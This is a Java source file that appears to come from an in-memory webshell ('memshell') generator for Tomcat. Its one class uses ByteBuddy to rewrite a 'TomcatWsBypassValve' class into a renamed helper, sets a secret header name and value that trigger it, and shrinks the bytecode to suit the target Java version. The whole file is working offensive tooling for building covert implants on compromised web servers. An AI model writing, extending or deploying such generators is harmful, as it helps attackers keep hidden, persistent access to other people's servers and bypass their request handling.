package com.reajason.javaweb.memshell.server.tomcat;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.HeaderAware;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import com.reajason.javaweb.utils.tuple.Pair;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2026/1/13
 */
public class WebSocketByPassHelperGenerator {
    public static byte[] getBytes(String helperClassName, ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        Pair<String, String> headerPair = getHeaderPair(shellToolConfig);
        if (headerPair == null) {
            throw new GenerationException("unsupported shell config: " + shellConfig.getShellTool());
        }
        DynamicType.Builder<TomcatWsBypassValve> builder = new ByteBuddy()
                .redefine(TomcatWsBypassValve.class)
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .field(named("headerName")).value(headerPair.getKey())
                .field(named("headerValue")).value(headerPair.getValue())
                .name(helperClassName);
        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }
        try (DynamicType.Unloaded<TomcatWsBypassValve> dynamicType = builder.make()) {
            return ClassBytesShrink.shrink(dynamicType.getBytes(), shellConfig.isShrink());
        }
    }

    private static Pair<String, String> getHeaderPair(ShellToolConfig shellToolConfig) {
        if (shellToolConfig instanceof HeaderAware) {
            HeaderAware headerAware = (HeaderAware) shellToolConfig;
            return Pair.of(headerAware.getHeaderName(), headerAware.getHeaderValue());
        }
        return null;
    }
}
